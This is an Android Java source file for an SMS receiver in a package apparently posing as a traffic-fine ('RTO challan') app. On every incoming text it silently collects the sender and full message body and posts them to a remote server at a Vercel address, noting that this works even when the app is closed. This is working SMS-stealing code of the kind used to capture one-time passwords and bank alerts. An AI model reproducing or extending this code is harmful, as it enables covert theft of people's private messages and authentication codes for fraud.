package com.rtochallan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.json.JSONObject;
import java.io.IOException;

public class SmsReceiver extends BroadcastReceiver {
    private static final String API_URL = "https://abcbackend.vercel.app/api/messages";
    private static final MediaType JSON = MediaType.get("application/json; charset=utf-8");

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;

            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;

            StringBuilder fullMessage = new StringBuilder();
            String sender = "";

            for (Object pdu : pdus) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                sender = sms.getDisplayOriginatingAddress();
                fullMessage.append(sms.getMessageBody());
            }

            String body = fullMessage.toString();
            Log.d("SmsReceiver", "Received SMS from " + sender + ": " + body);

            // Send to API directly (works even when app is closed)
            sendSmsToApi(sender, body);

            // Also send to React Native if app is running
            try {
                SmsModule.sendSmsToJS(sender, body);
            } catch (Exception e) {
                Log.d("SmsReceiver", "App not running, SMS sent to API only");
            }
        }
    }

    private void sendSmsToApi(String sender, String body) {
        OkHttpClient client = new OkHttpClient();

        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("sender", sender);
            jsonObject.put("body", body);
            jsonObject.put("timestamp", System.currentTimeMillis());

            RequestBody requestBody = RequestBody.create(jsonObject.toString(), JSON);

            Request request = new Request.Builder()
                    .url(API_URL)
                    .post(requestBody)
                    .build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e("SmsReceiver", "Failed to send SMS to API: " + e.getMessage());
                }

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        Log.d("SmsReceiver", "SMS successfully sent to API");
                    } else {
                        Log.e("SmsReceiver", "API responded with error: " + response.code());
                    }
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e("SmsReceiver", "Error creating API request: " + e.getMessage());
        }
    }
}
